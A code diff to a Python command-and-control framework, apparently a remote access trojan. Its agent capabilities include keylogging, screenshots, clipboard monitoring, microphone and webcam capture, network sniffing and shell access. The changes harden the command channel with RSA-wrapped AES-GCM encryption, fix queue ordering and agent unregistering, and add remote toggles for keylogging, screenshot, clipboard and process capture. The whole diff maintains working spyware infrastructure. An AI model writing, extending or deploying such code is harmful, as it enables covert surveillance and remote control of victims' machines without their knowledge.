@@ -10,6 +10,7 @@ from __future__ import annotations
 import asyncio
 import base64
 import hashlib
+import itertools
 import json
 import logging
 import os
@@ -152,6 +153,7 @@ class Command:
         """Convert to dictionary for transmission."""
         return {
             "command_id": self.command_id,
+            "agent_id": self.agent_id,
             "action": self.action,
             "parameters": self.parameters,
             "timestamp": self.timestamp,
@@ -181,13 +183,18 @@ class ProtocolMessage:
 
     def to_bytes(self) -> bytes:
         """Serialize message to bytes."""
+        signature_b64 = (
+            base64.b64encode(self.signature).decode("ascii")
+            if self.signature
+            else None
+        )
         data = {
             "version": self.version,
             "type": self.msg_type,
             "agent_id": self.agent_id,
             "timestamp": self.timestamp,
             "payload": self.payload,
-            "signature": base64.b64encode(self.signature).decode("ascii") if self.signature else None,
+            "signature": signature_b64,
         }
         return json.dumps(data).encode("utf-8")
 
@@ -261,10 +268,11 @@ class Controller:
         self.config = config
         self.agents: Dict[str, AgentMetadata] = {}
         self.commands: Dict[str, Command] = {}
-        self.command_queues: Dict[str, asyncio.PriorityQueue[Tuple[int, Command]]] = {}
+        self.command_queues: Dict[str, asyncio.PriorityQueue[Tuple[int, int, Command]]] = {}
         self.agent_channels: Dict[str, SecureChannel] = {}
         self.agent_transports: Dict[str, BaseTransport] = {}
         self.running = False
+        self._command_counter = itertools.count()
         self._command_processor_task: Optional[asyncio.Task] = None
         self._cleanup_task: Optional[asyncio.Task] = None
 
@@ -318,17 +326,22 @@ class Controller:
 
     def unregister_agent(self, agent_id: str) -> None:
         """Unregister an agent."""
-        if agent_id in self.agents:
-            self.agents[agent_id].status = AgentStatus.UNREGISTERED
-            del self.agents[agent_id]
-            del self.agent_channels[agent_id]
-            del self.command_queues[agent_id]
+        agent = self.agents.pop(agent_id, None)
+        if agent is None:
+            return
 
-            if agent_id in self.agent_transports:
-                self.agent_transports[agent_id].disconnect()
-                del self.agent_transports[agent_id]
+        agent.status = AgentStatus.UNREGISTERED
+        self.agent_channels.pop(agent_id, None)
+        self.command_queues.pop(agent_id, None)
 
-            logger.info(f"Agent unregistered: {agent_id}")
+        transport = self.agent_transports.pop(agent_id, None)
+        if transport:
+            try:
+                transport.disconnect()
+            except Exception:
+                pass
+
+        logger.info(f"Agent unregistered: {agent_id}")
 
     def send_command(
         self,
@@ -354,10 +367,11 @@ class Controller:
 
         self.commands[command.command_id] = command
 
-        # Add to agent's command queue
+        # Add to agent's command queue with monotonic counter as tiebreaker
         queue = self.command_queues.get(agent_id)
         if queue:
-            asyncio.create_task(queue.put((priority.value, command)))
+            seq = next(self._command_counter)
+            asyncio.create_task(queue.put((priority.value, seq, command)))
             logger.info(f"Command {command.command_id} queued for agent {agent_id}")
 
         return command.command_id
@@ -444,11 +458,17 @@ class Controller:
         """Process commands from queues and send to agents."""
         while self.running:
             try:
-                for agent_id, queue in self.command_queues.items():
+                # Snapshot to avoid RuntimeError if dict mutates during iteration
+                items = list(self.command_queues.items())
+                for agent_id, queue in items:
                     if queue.empty():
                         continue
 
-                    _, command = await queue.get()
+                    # Verify agent still registered before sending
+                    if agent_id not in self.agents:
+                        continue
+
+                    _, _seq, command = await queue.get()
                     await self._send_command_to_agent(agent_id, command)
 
                 await asyncio.sleep(0.1)  # Prevent CPU spinning
@@ -758,9 +778,29 @@ class Agent:
             if message.msg_type != "command":
                 return self._create_error_response("invalid_message_type")
 
-            # Decrypt command payload
-            encrypted_payload = message.payload.get("encrypted", "").encode()
-            decrypted_data = self.secure_channel.decrypt(encrypted_payload)
+            payload = message.payload
+
+            # Validate required hybrid-encryption fields
+            for field_name in ("encrypted_session_key", "aes_ciphertext", "nonce"):
+                if not payload.get(field_name):
+                    return self._create_error_response(
+                        f"missing_field: {field_name}"
+                    )
+
+            # Decode base64 fields
+            encrypted_session_key = base64.b64decode(payload["encrypted_session_key"])
+            aes_ciphertext = base64.b64decode(payload["aes_ciphertext"])
+            nonce = base64.b64decode(payload["nonce"])
+
+            # RSA-decrypt the AES session key
+            session_key = self.secure_channel.decrypt(encrypted_session_key)
+
+            # AES-GCM-decrypt the command payload
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+            aesgcm = AESGCM(session_key)
+            decrypted_data = aesgcm.decrypt(nonce, aes_ciphertext, None)
+
             command_dict = json.loads(decrypted_data.decode())
 
             # Convert priority string back to CommandPriority enum
@@ -798,15 +838,65 @@ class Agent:
         )
         return message.to_bytes()
 
+    # Allowed keys for remote config updates (safe, non-sensitive).
+    # Values are tuples of accepted types for isinstance() checks.
+    ALLOWED_CONFIG_KEYS: Dict[str, Tuple[type, ...]] = {
+        "heartbeat_interval": (int, float),
+        "reconnect_interval": (int, float),
+        "cap_keylogging": (bool,),
+        "cap_screenshots": (bool,),
+        "cap_clipboard": (bool,),
+        "cap_process": (bool,),
+    }
+
     # Default command handlers
     def _handle_ping(self, params: Dict[str, Any]) -> Dict[str, Any]:
         """Handle ping command."""
         return {"pong": True, "timestamp": time.time()}
 
     def _handle_update_config(self, params: Dict[str, Any]) -> Dict[str, Any]:
-        """Handle configuration update."""
-        self.config.update(params)
-        return {"status": "config_updated"}
+        """Handle configuration update (only whitelisted keys)."""
+        accepted = {}
+        rejected = {}
+        for key, value in params.items():
+            if key not in self.ALLOWED_CONFIG_KEYS:
+                rejected[key] = "not_allowed"
+                continue
+            expected_types = self.ALLOWED_CONFIG_KEYS[key]
+            if not isinstance(value, expected_types):
+                rejected[key] = f"invalid_type (expected {expected_types})"
+                continue
+            accepted[key] = value
+
+        self.config.update(accepted)
+
+        # Apply accepted values to runtime attributes
+        if "heartbeat_interval" in accepted:
+            self.heartbeat_interval = float(accepted["heartbeat_interval"])
+        if "reconnect_interval" in accepted:
+            self.reconnect_interval = float(accepted["reconnect_interval"])
+
+        # Rebuild capabilities if any cap_* keys changed
+        cap_keys = [k for k in accepted if k.startswith("cap_")]
+        if cap_keys:
+            self.capabilities = AgentCapabilities(
+                keylogging=self.config.get("cap_keylogging", self.capabilities.keylogging),
+                screenshots=self.config.get("cap_screenshots", self.capabilities.screenshots),
+                file_upload=self.config.get("cap_file_upload", self.capabilities.file_upload),
+                file_download=self.config.get("cap_file_download", self.capabilities.file_download),
+                clipboard_monitor=self.config.get("cap_clipboard", self.capabilities.clipboard_monitor),
+                microphone_record=self.config.get("cap_microphone", self.capabilities.microphone_record),
+                webcam_capture=self.config.get("cap_webcam", self.capabilities.webcam_capture),
+                process_monitor=self.config.get("cap_process", self.capabilities.process_monitor),
+                network_sniff=self.config.get("cap_network", self.capabilities.network_sniff),
+                shell_access=self.config.get("cap_shell", self.capabilities.shell_access),
+            )
+
+        return {
+            "status": "config_updated",
+            "accepted": list(accepted.keys()),
+            "rejected": rejected,
+        }
 
     def _handle_get_status(self, params: Dict[str, Any]) -> Dict[str, Any]:
         """Handle status request."""
